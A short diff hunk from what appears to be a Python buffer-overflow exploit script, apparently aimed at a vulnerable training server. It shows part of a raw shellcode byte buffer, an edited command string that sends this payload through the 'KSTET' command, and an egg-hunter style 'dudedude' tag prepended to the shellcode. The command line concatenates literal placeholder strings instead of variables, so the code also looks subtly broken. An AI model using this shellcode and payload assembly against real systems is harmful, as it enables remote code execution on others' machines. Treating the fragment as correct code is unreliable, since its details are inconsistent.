@@ -39,7 +39,7 @@ buf += b"\xf6\x4b\xb7\xac\x77\x6b\x38\x51\x9e\x08\x39\x51\x9e"
 buf += b"\x2e\x06\x87\xa7\x44\x49\x1b\x9c\x57\xfc\x3e\xb5\xfd"
 buf += b"\xfe\x6d\xc5\xd7"
 
-cmd = "GDOG " + "shellcode" + "KSTET " + "stuff"
+cmd = "STATS " + "shellcode" + "KSTET " + "stuff"
 
 shellcode = "dudedude" + buf
 
